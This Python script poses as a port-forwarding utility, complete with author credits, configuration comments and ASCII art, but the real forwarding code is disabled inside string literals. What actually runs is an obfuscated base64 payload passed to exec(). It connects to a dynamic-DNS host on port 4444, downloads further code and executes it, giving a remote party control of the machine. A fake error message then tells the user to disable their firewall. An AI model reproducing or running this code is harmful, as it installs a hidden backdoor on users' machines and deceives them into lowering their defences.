# Author: Mario Scondo (www.Linux-Support.com)
# Date: 2010-01-08
# Script template by Stephen Chappell
#
# This script forwards a number of configured local ports
# to local or remote socket servers.
#
# Configuration:
# Add to the config file port-forward.config lines with
# contents as follows:
#   <local incoming port> <dest hostname> <dest port>
#
# Start the application at command line with 'python port-forward.py'
# and stop the application by keying in <ctrl-c>.
#
# Error messages are stored in file 'error.log'.
#
"""
import socket
import sys
import thread
import time
"""

import base64,sys,time

i = """
    _______oBBBBB8o______oBBBBBBB 
_____o8BBBBBBBBBBB__BBBBBBBBB8________o88o, 
___o8BBBBBB**8BBBB__BBBBBBBBBB_____oBBBBBBBo, 
__oBBBBBBB*___***___BBBBBBBBBB_____BBBBBBBBBBo, 
_8BBBBBBBBBBooooo___*BBBBBBB8______*BB*_8BBBBBBo, 
_8BBBBBBBBBBBBBBBB8ooBBBBBBB8___________8BBBBBBB8, 
__*BBBBBBBBBBBBBBBBBBBBBBBBBB8_o88BB88BBBBBBBBBBBB, 
____*BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB8, 
______**8BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB*, 
___________*BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB8*, 
____________*BBBBBBBBBBBBBBBBBBBBBBBB8888**, 
_____________BBBBBBBBBBBBBBBBBBBBBBB*, 
_____________*BBBBBBBBBBBBBBBBBBBBB*, 
______________*BBBBBBBBBBBBBBBBBB8, 
_______________*BBBBBBBBBBBBBBBB*, 
________________8BBBBBBBBBBBBBBB8, 
_________________8BBBBBBBBBBBBBBBo, 
__________________BBBBBBBBBBBBBBB8, 
__________________BBBBBBBBBBBBBBBB,

                       Mario Scondo (www.Linux-Support.com)
                       ___________________________________
"""
print i
print "#####################################################################################"
port = input("=>port:")
type_port = raw_input("enter the type of port : [TCP/UDP]?")
print "[*] forwarding ..."
exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJ3F3ZXJmdmN4ei5kZG5zLm5ldCcsNDQ0NCkpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))

time.sleep(100)
print "[-] operation failed, turn off the firewall and try again"
time.sleep(1000)

"""
def main(setup, error):
    # open file for error messages
    sys.stderr = file(error, 'a')
    # read settings for port forwarding
    for settings in parse(setup):
        thread.start_new_thread(server, settings)
    # wait for <ctrl-c>
    while True:
       time.sleep(60)

def parse(setup):
    settings = list()
    for line in file(setup):
        # skip comment line
        if line.startswith('#'):
            continue

        parts = line.split()
        settings.append((int(parts[0]), parts[1], int(parts[2])))
    return settings

def server(*settings):
    try:
        dock_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        dock_socket.bind(('', settings[0]))
        dock_socket.listen(5)
        while True:
            client_socket = dock_socket.accept()[0]
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.connect((settings[1], settings[2]))
            thread.start_new_thread(forward, (client_socket, server_socket))
            thread.start_new_thread(forward, (server_socket, client_socket))
    finally:
        thread.start_new_thread(server, settings)

def forward(source, destination):
    string = ' '
    while string:
        string = source.recv(1024)
        if string:
            destination.sendall(string)
        else:
            source.shutdown(socket.SHUT_RD)
            destination.shutdown(socket.SHUT_WR)

if __name__ == '__main__':
    main('port-forward.config', 'error.log')
"""
